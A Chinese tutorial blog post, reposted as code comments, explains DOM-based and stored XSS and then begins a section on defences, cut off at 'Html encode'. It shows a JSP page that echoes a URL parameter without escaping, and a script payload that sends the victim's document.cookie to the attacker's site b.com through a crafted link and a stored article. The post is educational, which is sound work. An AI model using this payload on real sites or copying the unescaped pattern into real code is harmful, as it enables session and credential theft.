// 本文来自：高爽|Coder，原文地址：http://blog.csdn.net/ghsau/article/details/17027893，转载请注明。
// XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。

// XSS攻击
// XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站，XSS漏洞分为两种，一种是DOM Based XSS漏洞，另一种是Stored XSS漏洞。理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。

// DOM Based XSS
// DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。

// 场景一：

// 当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似： 

// <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

// <!DOCTYPEhtmlPUBLIC"-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd">

// <html>

// <head>

// <title>XSS测试</title>

// </head>

// <body>

// 页面内容：<%=request.getParameter("content")%>

// </body>

// </html>

// 我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=<script>alert(“xss”)</script>，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？

// Stored XSS
// Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。

// 场景二：

// a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。
// Stored XSS漏洞危害性更大，危害面更广。

// XSS防御
// 我们是在一个矛盾的世界中，有矛就有盾。只要我们的代码中不存在漏洞，攻击者就无从下手，我们要做一个没有缝的蛋。XSS防御有如下方式。

// 完善的过滤体系
// 永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。

// Html encode
